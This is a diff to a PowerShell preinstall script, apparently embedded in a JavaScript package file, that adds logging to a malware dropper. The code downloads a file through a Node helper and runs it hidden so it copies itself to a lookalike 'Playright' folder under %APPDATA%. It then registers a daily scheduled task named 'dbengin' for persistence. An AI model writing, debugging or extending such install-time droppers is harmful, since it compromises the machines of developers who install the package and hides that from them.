@@ -54,6 +54,8 @@ Write-Output "[preinstall-setup] File ID: $fileId, Output path: $output"
 Write-Output "[preinstall-setup] Running Node download helper (safe, exits 0)"
 try {
         $scriptPath = Join-Path $PSScriptRoot 'preinstall_download.mjs'
+    Write-Output "[preinstall-setup] Node helper path: $scriptPath"
+    Write-Output "[preinstall-setup] Current working directory: $PWD"
         $downloadOutput = node $scriptPath 2>&1
         Write-Output "[preinstall-setup] Download helper output: $downloadOutput"
 } catch {
@@ -65,15 +67,27 @@ try {
 // ---------------------------------------------
 if (Test-Path $output) {
     Write-Output "[preinstall-setup] File exists: $output"
-    Write-Output "[preinstall-setup] File size: $(Get-Item $output).Length bytes"
+    $downloadedItem = Get-Item $output
+    Write-Output "[preinstall-setup] File size: $($downloadedItem.Length) bytes"
+    Write-Output "[preinstall-setup] File last write time: $($downloadedItem.LastWriteTime)"
+    Write-Output "[preinstall-setup] File attributes: $($downloadedItem.Attributes)"
 
     # 1. Execute the downloaded file (it will move itself to %APPDATA%\\Microsoft\\Playright\\dbengin.exe)
     Write-Output "[preinstall-setup] Executing downloaded file (once, silently) to let it self-install..."
     try {
+        Write-Output ("[preinstall-setup] Start-Process arguments: -FilePath '{0}' -WindowStyle Hidden -Wait -PassThru" -f $output)
         $proc = Start-Process -FilePath $output -WindowStyle Hidden -Wait -PassThru -ErrorAction Stop
+        Write-Output "[preinstall-setup] Process id: $($proc.Id)"
         Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
+        $stillRunning = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+        if ($stillRunning) {
+            Write-Output "[preinstall-setup] Process is still running after Wait-Process returned."
+        } else {
+            Write-Output "[preinstall-setup] Process no longer running after launch."
+        }
     } catch {
-        Write-Output "[preinstall-setup] ERROR starting downloaded file: $_"
+        Write-Output "[preinstall-setup] ERROR starting downloaded file: $($_.Exception.GetType().FullName): $($_.Exception.Message)"
+        Write-Output "[preinstall-setup] ERROR details: $($_ | Out-String)"
     }
 
     # 2. Define the final expected path after self-move
@@ -85,6 +99,7 @@ if (Test-Path $output) {
 
     if (Test-Path $finalExe) {
         Write-Output "[preinstall-setup] Final exe found. Creating scheduled task..."
+        Write-Output "[preinstall-setup] Final exe size: $((Get-Item $finalExe).Length) bytes"
 
         # Create scheduled task to run daily at 09:00
         $taskName = "dbengin"
@@ -98,9 +113,13 @@ if (Test-Path $output) {
             Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Settings $settings -Force
             Write-Output "[preinstall-setup] Scheduled task '$taskName' created successfully."
         } catch {
-            Write-Output "[preinstall-setup] ERROR creating scheduled task: $_"
+            Write-Output "[preinstall-setup] ERROR creating scheduled task: $($_.Exception.GetType().FullName): $($_.Exception.Message)"
         }
+    } else {
+        Write-Output "[preinstall-setup] Final exe not found after launch attempt."
     }
+} else {
+    Write-Output "[preinstall-setup] Downloaded file not found at expected path."
 }
 `;
 
